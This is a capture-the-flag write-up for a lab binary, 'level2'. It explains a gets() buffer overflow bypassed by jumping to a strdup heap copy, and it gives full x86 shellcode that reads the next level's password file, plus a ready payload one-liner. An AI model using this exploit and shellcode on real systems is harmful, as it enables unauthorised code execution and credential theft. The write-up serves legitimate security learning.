This one was a bit harder ! 

We have a binary file `./level2`, when we execute it, it reads stdin. If we write too much characters, the program segfaults.

By reading disassembly in Ghidra, we can see the `main` and `p` functions.  

The `p` function just reads stdin with gets in a buffer[76] on the stack ; then there's a check that the saved EIP on the stack doesn't contain an address starting with 0xB. 
This means that we can't make it point to the stack, the env or the libc for example.
Another thing of note is that the buffer is given to `strdup` at the end of the function (why? lol)

Since we can't overwrite EIP to point to the stack, we can instead point to the heap (thanks strdup for being here).
We can see that the return value of `strdup` is always the same, so all we need to do is just write this address on EIP.
Then, we'll be able to run anything that we put in the buffer. 

We write a shellcode. We could have run `execve("/bin/sh")` but we prefered write a shellcode that runs `/bin/cat /home/user/level3/.pass`.
```asm
xor    %edx,%edx   ; edx = 0 => env = NULL
xor    %eax, eax   ; eax = 0
push   %edx        ; \0
push   $0x73736170 ; pass
push   $0x2E2F2F33 ; 3//.
push   $0x6C657665 ; evel
push   $0x6C2F7265 ; er/l
push   $0x73752F65 ; e/us
push   $0x6D6F682F ; /hom
mov    %esp,%ecx   ; pointeur vers arg
push   %eax        ; \0
push   $0x7461632F ; /cat
push   $0x6E69622F ; /bin
mov    %esp,%ebx   ; pointeur vers path
push   %eax        ; NULL
push   %ecx        ; "/home/user/level3/.pass"
push   %ebx        ; "/bin/cat"
mov    %esp,%ecx   ; pointeur vers tableau d'args
mov    $0xb,%al    ; eax = 0x0b => execve
int    $0x80       ; interrupt syscall, run execve
```

Here is visualization of the stack at the end of our shellcode :
```
| 0x?? | <- "/bin/cat" <- ecx
| 0x?? | <- "/home/user/level3/.pass"
| NULL |
| /bin | <- ebx
| /cat |
| 0000 |
| /hom |
| e/us |
| er/l |
| evel |
| 3//. |
| pass |
```

After compiling the shellcode with `gcc -c shellcode.s` and extracting the hexadecimal representation with `objdump -S shellcode.o` we end up with this: 
```
\x31\xd2\x31\xc0\x52\x68\x70\x61\x73\x73\x68\x33\x2f\x2f\x2e\x68\x65\x76\x65\x6c\x68\x65\x72\x2f\x6c\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe1\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80
```

Now we extract the address returned by `strdup` with GDB. We calculate the offset needed to overwrite EIP and we can craft the payload :
```bash
python -c 'print "\x31\xd2\x31\xc0\x52\x68\x70\x61\x73\x73\x68\x33\x2f\x2f\x2e\x68\x65\x76\x65\x6c\x68\x65\x72\x2f\x6c\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe1\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80" + (80-59)*"\x00" + "\x08\x04\xa0\x08"[::-1]'
```
Just pipe this in `./level2` and we get the flag! Tadaaaaaa!

(We also can use this shellcode : https://shell-storm.org/shellcode/files/shellcode-575.html)
